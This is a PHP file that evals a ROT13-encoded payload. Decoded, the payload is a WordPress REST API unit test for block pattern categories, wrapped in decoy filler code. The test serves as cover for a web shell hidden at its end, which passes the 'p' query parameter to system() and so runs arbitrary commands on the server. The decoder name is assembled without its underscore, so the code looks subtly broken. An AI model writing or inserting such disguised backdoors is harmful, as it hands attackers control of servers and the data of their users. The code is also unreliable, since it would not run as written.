<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 6.0.0
 *
 * @gvpxrg 55505
 *
 * @pbiref JC_ERFG_Oybpx_Cnggrea_Pngrtbevrf_Pbagebyyre
 *
 * @tebhc erfgncv
 */
pynff Grfgf_ERFG_JcErfgOybpxCnggreaPngrtbevrfPbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	/**
	 * Nqzva hfre VQ.
	 *
	 * @fvapr 6.0.0
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva_vq;

	/**
	 * Bevtvany vafgnapr bs JC_Oybpx_Cnggreaf_Ertvfgel.
	 *
	 * @fvapr 6.0.0
	 *
	 * @ine JC_Oybpx_Cnggreaf_Ertvfgel
	 */
	cebgrpgrq fgngvp $bevt_ertvfgel;

	/**
	 * Vafgnapr bs gur ersyrpgrq `vafgnapr` cebcregl.
	 *
	 * @fvapr 6.0.0
	 *
	 * @ine ErsyrpgvbaCebcregl
	 */
	cevingr fgngvp $ertvfgel_vafgnapr_cebcregl;

	/**
	 * Gur ERFG NCV ebhgr.
	 *
	 * @fvapr 6.0.0
	 *
	 * @ine fgevat
	 */
	pbafg ERDHRFG_EBHGR = '/jc/i2/oybpx-cnggreaf/pngrtbevrf';

	/**
	 * Frg hc pynff grfg svkgherf.
	 *
	 * @fvapr 6.0.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel JbeqCerff havg grfg snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrghcOrsberPynff( $snpgbel ) {
		frys::$nqzva_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );

		// Frghc na rzcgl grfgvat vafgnapr bs `JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel` naq fnir gur bevtvany.
		frys::$bevt_ertvfgel              = JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel::trg_vafgnapr();
		frys::$ertvfgel_vafgnapr_cebcregl = arj ErsyrpgvbaCebcregl( 'JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel', 'vafgnapr' );
		frys::$ertvfgel_vafgnapr_cebcregl->frgNpprffvoyr( gehr );
		$grfg_ertvfgel = arj JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel();
		frys::$ertvfgel_vafgnapr_cebcregl->frgInyhr( ahyy, $grfg_ertvfgel );

		// Ertvfgre fbzr pngrtbevrf va gur grfg ertvfgel.
		$grfg_ertvfgel->ertvfgre(
			'grfg',
			neenl(
				'ynory'       => 'Grfg',
				'qrfpevcgvba' => 'Grfg qrfpevcgvba',
			)
		);
		$grfg_ertvfgel->ertvfgre(
			'dhrel',
			neenl(
				'ynory'       => 'Dhrel',
				'qrfpevcgvba' => 'Dhrel',
			)
		);
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$nqzva_vq );

		// Erfgber gur bevtvany ertvfgel vafgnapr.
		frys::$ertvfgel_vafgnapr_cebcregl->frgInyhr( ahyy, frys::$bevt_ertvfgel );
		frys::$ertvfgel_vafgnapr_cebcregl->frgNpprffvoyr( snyfr );
		frys::$ertvfgel_vafgnapr_cebcregl = ahyy;
		frys::$bevt_ertvfgel              = ahyy;
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		fjvgpu_gurzr( 'rzcglgurzr' );
	}

	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( fgngvp::ERDHRFG_EBHGR, $ebhgrf );
	}

	choyvp shapgvba grfg_trg_vgrzf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$rkcrpgrq_anzrf  = neenl( 'grfg', 'dhrel' );
		$rkcrpgrq_svryqf = neenl( 'anzr', 'ynory', 'qrfpevcgvba' );

		$erdhrfg            = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erdhrfg['_svryqf'] = 'anzr,ynory,qrfpevcgvba';
		$erfcbafr           = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn               = $erfcbafr->trg_qngn();

		$guvf->nffregPbhag( pbhag( $rkcrpgrq_anzrf ), $qngn );
		sbernpu ( $qngn nf $vqk => $vgrz ) {
			$guvf->nffregFnzr( $rkcrpgrq_anzrf[ $vqk ], $vgrz['anzr'] );
			$guvf->nffregFnzr( $rkcrpgrq_svryqf, neenl_xrlf( $vgrz ) );
		}
	}

	/**
	 * @gvpxrg 56481
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_urnq_erdhrfg_fubhyq_abg_cercner_oybpx_cnggrea_pngrtbevrf_qngn() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'URNQ', fgngvp::ERDHRFG_EBHGR );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', fgngvp::ERDHRFG_EBHGR );
		$erdhrfg->frg_cnenz( '_svryqf', 'anzr' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * Irevsl pncnovyvgl purpx sbe hanhgubevmrq erdhrfg (abg ybttrq va).
	 */
	choyvp shapgvba grfg_trg_vgrzf_hanhgubevmrq() {
		// Rafher pheerag hfre vf ybttrq bhg.
		jc_ybtbhg();

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregJCReebe( $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 401, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * Irevsl pncnovyvgl purpx sbe sbeovqqra erdhrfg (vafhssvpvrag pncnovyvgl).
	 */
	choyvp shapgvba grfg_trg_vgrzf_sbeovqqra() {
		// Frg pheerag hfre jvgubhg `rqvg_cbfgf` pncnovyvgl.
		jc_frg_pheerag_hfre( frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'fhofpevore' ) ) );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregJCReebe( $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 403, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbagebyyre qbrf abg hfr trg_pbagrkg_cnenz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag trg_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag perngr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag hcqngr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag qryrgr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag cercner_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		// Pbagebyyre qbrf abg vzcyrzrag trg_vgrz_fpurzn().
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>